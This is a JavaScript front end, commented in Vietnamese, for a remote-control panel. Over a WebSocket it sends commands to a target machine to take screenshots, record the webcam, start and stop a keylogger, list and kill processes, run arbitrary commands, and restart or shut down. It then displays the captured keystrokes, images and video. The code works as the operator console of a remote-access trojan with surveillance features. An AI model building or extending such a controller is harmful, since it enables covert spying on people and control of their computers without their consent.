
var socketUrl = "ws://" + window.location.host + "/control";
var socket = new WebSocket(socketUrl);

// 1. KHI KẾT NỐI THÀNH CÔNG
socket.onopen = function (event) {
    console.log("Connected!");
    var statusDiv = document.getElementById("connectionStatus");
    statusDiv.innerText = "Đã kết nối Admin (Ready)";
    statusDiv.className = "alert alert-success";

    // Ẩn màn hình tối nếu có
    document.getElementById("deadOverlay").style.display = "none";
};

// 2. KHI MẤT KẾT NỐI (HIỆN DEAD BODY REPORTED)
// KHI MẤT KẾT NỐI (Sửa lại đoạn này)
socket.onclose = function (event) {
    var statusDiv = document.getElementById("connectionStatus");

    // Chỉ báo dòng chữ thôi, đừng hiện màn hình đen vội
    statusDiv.innerText = "MẤT KẾT NỐI (SERVER OFF)";
    statusDiv.className = "alert alert-danger";

    // --- QUAN TRỌNG: KHÓA 2 DÒNG NÀY LẠI ĐỂ KHÔNG BỊ ĐEN MÀN HÌNH ---
    // statusDiv.className = "dead-body-alert"; 
    // document.getElementById("deadOverlay").style.display = "block"; 
};

// 3. NHẬN DỮ LIỆU TỪ SERVER
socket.onmessage = function (event) {
    var data = JSON.parse(event.data);
    var imgTag = document.getElementById("imgResult");
    var textTag = document.getElementById("textResult");
    var videoTag = document.getElementById("videoResult");

    if (data.Name === "ScreenshotResponse") {
        textTag.style.display = "none";
        videoTag.style.display = "none";
        imgTag.style.display = "block";
        imgTag.src = "data:image/jpeg;base64," + data.Data;
    }
    else if (data.Name === "WebcamRecord") {
        textTag.style.display = "none";
        imgTag.style.display = "none";
        videoTag.style.display = "block";
        videoTag.src = "data:video/mp4;base64," + data.Data;
        videoTag.play();
    }
    else if (data.Name === "TaskList") {
        imgTag.style.display = "none";
        textTag.style.display = "block";

        var tasks = data.Data;
        var html = `
        <table class="table table-hover table-dark">
            <thead>
                <tr>
                    <th>PID</th>
                    <th>Tên tiến trình (Task Name)</th>
                    <th>Hành động</th>
                </tr>
            </thead>
            <tbody>`;

        tasks.forEach(task => {
            html += `
            <tr>
                <td><span class="badge bg-secondary">${task.ID || task.Id}</span></td>
                <td><b class="text-warning">${task.Name}</b></td>
                <td>
                    <button class="btn btn-danger btn-sm" onclick="guiLenh('StopTask', { ID: ${task.ID || task.Id} })">
                        Stop
                    </button>
                </td>
            </tr>`;
        });

        html += "</tbody></table>";
        textTag.innerHTML = html;
    }
    else if (data.Name === "InstalledAppList") {
        imgTag.style.display = "none";
        textTag.style.display = "block";
        var apps = data.Data;
        var html = `<table class="table table-dark"><thead><tr><th>Tên ứng dụng</th><th>Đường dẫn</th></tr></thead><tbody>`;
        apps.forEach(app => {
            html += `<tr><td>${app.Name}</td><td><small>${app.ExecutablePath}</small></td></tr>`;
        });
        html += "</tbody></table>";
        textTag.innerHTML = html;
    }
    else {
        if (data.Name === "KeyloggerData" || !data.Name) {
            textTag.innerText += (data.Data || data.Message || "");
        } else {
            textTag.innerText = data.Message || "Đã nhận lệnh";
        }
    }
};

// 4. HÀM GỬI LỆNH
function guiLenh(cmd, param = "") {
    if (socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify({ Name: cmd, Data: param }));
        // Hiện thông báo chờ trên màn hình tablet
        document.getElementById("textResult").innerText = ">> Đang gửi lệnh: " + cmd + "...\n>> Chờ phản hồi...";
        document.getElementById("textResult").style.display = "block";
        document.getElementById("imgResult").style.display = "none";
    } else {
        alert("Đã mất kết nối! Không thể gửi lệnh.");
    }
}

// 5. GÁN SỰ KIỆN CHO CÁC NÚT (KHỚP VỚI FILE INDEX)
document.addEventListener("DOMContentLoaded", function () {

    // Nút Chụp màn hình (Mới)
    var btnShot = document.getElementById("btnScreenshot");
    if (btnShot) btnShot.onclick = function () { guiLenh("Screenshot"); };

    // Nút Webcam
    var btnCam = document.getElementById("btnWebcam");
    btnCam.onclick = function () { guiLenh("WebcamRecord"); };

    // Nút Keylog
    var isLogging = false;
    var btnKey = document.getElementById("btnKeylog");
    if (btnKey) btnKey.onclick = function () {
        isLogging = !isLogging;
        if (isLogging) {
            guiLenh("KeyLogger", "On"); // Khớp với Mục 11
            btnKey.innerText = "Stop Keylog";
        } else {
            guiLenh("StopKeyLogger", "Off");
            btnKey.innerText = "Start Keylog";
        }
    };

    // Nút Apps
    var btnApps = document.getElementById("btnListApps");
    if (btnApps) btnApps.onclick = function () { guiLenh("ListInstalledApp"); };

    // Nút Processes
    var btnProcs = document.getElementById("btnListProcesses");
    if (btnProcs) {
        btnProcs.onclick = function () {
            guiLenh("ListTask");
        };
    }

    // Nút Chạy lệnh
    var btnRun = document.getElementById("btnRunCommand");
    if (btnRun) {
        btnRun.onclick = function () {
            var cmd = prompt("Nhập tên tiến trình hoặc lệnh (VD: notepad.exe):", "");
            if (cmd) guiLenh("StartTask", cmd);
        };
    }
    var btnStop = document.getElementById("btnStopTask");
    if (btnStop) {
        btnStop.onclick = function () {
            var pid = prompt("Nhập ID (PID) của tiến trình cần dừng:", "");
            if (pid) guiLenh("StopTask", { ID: parseInt(pid) });
        };
    }
});

// Nút Restart
var btnRes = document.getElementById("btnRestart");
if (btnRes) btnRes.onclick = function () { if (confirm("Xác nhận khởi động lại")) guiLenh("Restart"); };

// Nút Shutdown
var btnShut = document.getElementById("btnShutdown");
if (btnShut) btnShut.onclick = function () { if (confirm("Xác nhận tắt nguồn")) guiLenh("Shutdown"); };